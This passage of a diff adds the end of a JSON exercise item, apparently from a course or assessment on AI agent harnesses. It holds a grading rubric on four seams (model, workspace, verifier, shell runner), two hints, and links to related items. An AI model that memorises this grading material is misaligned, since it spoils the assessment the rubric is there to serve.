+      "rubric": [
+        {
+          "criterion": "Covers all four seams (model, workspace, verifier, runner) and what each swap does to risk",
+          "points": 4
+        },
+        {
+          "criterion": "Identifies the shell runner behind a deny list as the largest risk and why",
+          "points": 2
+        },
+        {
+          "criterion": "Names a live-only default that bites, such as truncation at max_tokens or the in-memory workspace",
+          "points": 2
+        },
+        {
+          "criterion": "Lists Build #2's layers, or equivalents, as preconditions for unattended runs",
+          "points": 2
+        }
+      ],
+      "hints": [
+        "Walk the four seams one at a time.",
+        "Ask which gaps the offline suite hid, and which layer closes each."
+      ],
+      "connects": [
+        "hrn-025",
+        "hrn-014",
+        "hrn-008"
+      ]
+    }
+  ]
+}
